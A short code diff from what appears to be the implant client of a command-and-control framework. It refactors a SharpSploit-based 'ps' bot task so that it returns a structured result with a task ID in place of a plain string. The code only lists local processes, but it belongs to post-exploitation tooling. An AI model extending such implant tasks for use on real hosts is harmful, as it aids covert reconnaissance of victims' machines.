@@ -12,7 +12,7 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "ps";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
             var results = new SharpSploitResultList<ListProcessesResult>();
             var processes = Process.GetProcesses();
@@ -33,7 +33,11 @@ namespace pattaya_project_client.Commands.Implements
                 results.Add(result);
             }
 
-            return results.ToString();
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = results.ToString()
+            };
         }
 
 
